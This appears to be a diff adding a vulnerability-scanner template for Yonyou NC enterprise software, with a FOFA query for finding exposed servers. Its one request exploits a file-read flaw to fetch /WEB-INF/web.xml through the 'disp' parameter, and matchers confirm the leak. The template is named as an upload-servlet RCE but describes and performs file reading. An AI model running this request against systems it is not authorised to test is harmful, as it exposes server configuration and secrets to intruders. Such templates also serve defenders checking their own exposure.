@@ -1,0 +1,24 @@
+id: yonyon-nc-uploadservlet-rce
+info:
+  name: yonyon-nc-uploadservlet-rce
+  author: unknow
+  severity: critical
+  description: 用友NC文件读取。https://mp.weixin.qq.com/s/MaEidmZ1FZmNVE-UJf7h4Q
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyon,rce,yonyounc
+http:
+  - raw:
+      - |
+        GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: Keep-Alive
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<web-app version="
+          - "xmlns="
+        condition: and
